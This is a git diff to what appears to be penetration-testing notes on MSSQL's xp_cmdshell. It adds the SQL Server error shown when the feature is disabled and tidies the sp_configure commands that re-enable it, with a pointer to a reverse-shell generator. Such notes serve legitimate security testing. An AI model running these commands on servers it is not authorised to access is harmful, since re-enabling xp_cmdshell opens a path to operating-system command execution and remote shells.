@@ -23,13 +23,15 @@ xp_cmdshell <command to execute>
 # https://www.revshells.com/
 # PowerShell #3 (Base64)
 ```
+In case of errors like
+```
+ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+```
 More advanced way to turn on xp_cmdshell
 https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
 ```
-EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
-first as it’s disabled by default:
-EXEC sp_configure 'show advanced options', 1; — priv
-RECONFIGURE; — priv
-EXEC sp_configure 'xp_cmdshell', 1; — priv
-RECONFIGURE; — priv
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
 ```
